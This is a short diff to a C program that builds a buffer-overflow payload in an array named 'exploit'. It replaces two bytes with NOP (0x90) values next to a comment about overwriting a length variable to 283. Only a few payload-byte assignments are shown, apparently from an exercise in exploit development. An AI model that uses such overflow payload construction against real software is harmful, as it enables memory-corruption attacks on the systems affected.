@@ -73,8 +73,10 @@ main ( int argc, char * argv[] )
 	
 	exploit[264] = '\x0b';
 	exploit[265] = '\x01';
-	exploit[266] = '\x01';
-	exploit[267] = '\x01';
+
+	// jumping over other two bytes
+	exploit[266] = '\x90';
+	exploit[267] = '\x90';
 
 	// overwrite value of len to 283
 	exploit[268] = '\x1b';
